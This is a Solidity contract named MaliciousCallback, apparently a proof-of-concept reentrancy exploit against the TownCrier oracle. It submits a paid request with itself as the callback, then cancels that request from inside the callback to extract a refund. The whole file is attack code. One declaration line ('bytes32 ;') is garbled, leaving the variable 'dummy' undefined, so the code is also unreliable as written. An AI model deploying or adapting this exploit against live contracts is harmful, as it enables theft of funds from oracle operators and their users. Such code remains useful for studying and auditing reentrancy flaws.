pragma solidity ^0.4.9;

interface ITownCrier {
    function request(
        uint8 requestType,
        address callbackAddr,
        bytes4 callbackFID,
        uint timestamp,
        bytes32[] requestData
    ) external payable returns (int);

    function cancel(uint64 requestId) external returns (int);
}

contract MaliciousCallback {
    ITownCrier public townCrier;
    uint64 public myRequestId;

    bool public reentering;

    function MaliciousCallback(address _tc) public {
        townCrier = ITownCrier(_tc);
    }

    function launchAttack() external payable {
        bytes32 ;
        dummy[0] = keccak256("exploit");

        int rid = townCrier.request.value(msg.value)(
            1,         // requestType
            this,      // callback to self
            this.receiveCallback.selector,
            now + 1,
            dummy
        );

        require(rid > 0);
        myRequestId = uint64(rid);
    }

    function receiveCallback(uint64 requestId, uint64 error, bytes32 respData) public {
        if (!reentering) {
            reentering = true;

            // reentrantly cancel request inside callback
            townCrier.cancel(myRequestId);
        }
    }

    // Accept fallback from TC
    function() public payable {}
}

